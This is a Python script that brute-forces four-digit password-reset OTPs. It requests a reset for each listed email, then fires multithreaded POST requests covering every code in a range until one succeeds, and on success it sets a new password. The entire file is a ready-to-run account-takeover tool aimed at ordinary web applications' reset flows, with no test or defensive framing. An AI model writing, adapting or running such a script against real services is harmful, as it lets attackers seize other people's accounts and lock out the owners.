import concurrent.futures
import os
import sys
from pathlib import Path
import requests
import threading
import json

# Event to signal other threads to stop searching once OTP is found
found_valid_otp = threading.Event()
successful_otp = None  # Variable to store the successful OTP value

def request_password_reset(config: dict, email: str) -> int:
    """
    Send a POST request to reset forgotten password using the provided configuration.
    
    Args:
        config (dict): Dictionary containing configuration parameters.
        
    Returns:
        int: Status code of the HTTP response.
    """
    url = config["request_pass_reset_url"]
    payload = {"email": email}
    # Make a POST request with the payload
    response = requests.post(url, json=payload)
    return response.status_code

# Function to make HTTP POST request with a specific OTP value
def attempt_with_otp(config: dict, email: str, otp: int) -> None:
    """
    Attempt to authenticate using a specific OTP value and provided configuration.
    Sets global flags if a valid OTP is found.
    
    Args:
        config (dict): Dictionary containing configuration parameters.
        otp (int): OTP value to attempt.
    """
    global found_valid_otp, successful_otp

    if found_valid_otp.is_set():
        return  # If valid OTP already found, stop processing further
    
    target_url = config["target_url"]
    payload = {
        "email": email,
        "otp": f"{otp:04}",
        "password": config["password"]
    }
    
    response = requests.post(target_url, json=payload)
    print(f"Trying OTP: {otp:04} - Response status code: {response.status_code}")

    if response.status_code == 200:
        found_valid_otp.set()  # Set the event to signal other threads to stop
        successful_otp = otp  # Store the successful OTP value

def main():
    # Get the directory path of the current script
    file_dir_path = Path(__file__).resolve().parent

    # Load configurations from config.json
    with open(file_dir_path / "config.json", "r") as config_file:
        config = json.load(config_file)

    start_otp = config["start_otp"]
    end_otp = config["end_otp"]
    
    for email in config["emails"]:
        # Check if the password reset URL request is valid
        if request_password_reset(config, email) != 200:
            print("Incorrect reset forgotten password URL in config.")
            sys.exit(1)  # Exit the program with status code 1 (indicating failure)

        # Determine optimal number of worker threads based on system capabilities
        num_cores = os.cpu_count()
        max_workers = min(num_cores * 2, 32)  # Example: Use up to 2x CPU cores or maximum of 32 threads

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit tasks for each OTP value within the range
            future_to_otp = {executor.submit(attempt_with_otp, config, email, otp): otp for otp in range(start_otp, end_otp + 1)}

            # Process results as tasks are completed
            for future in concurrent.futures.as_completed(future_to_otp):
                otp = future_to_otp[future]
                try:
                    future.result()  # Get the result of the completed task
                except Exception as exc:
                    print(f"OTP {otp:04} generated an exception: {exc}")

                if found_valid_otp.is_set():
                    print("Stopping further OTP search...")
                    break  # Stop processing further OTP values if valid OTP is found

        # Output the result based on whether a valid OTP was found
        print(f"Results for: {email}")
        if successful_otp is not None:
            print(f"Success! Valid OTP found: {successful_otp:04}")
            print(f"Changed password to: {config['password']}")
        else:
            print("No valid OTP found.")

if __name__ == "__main__":
    main()
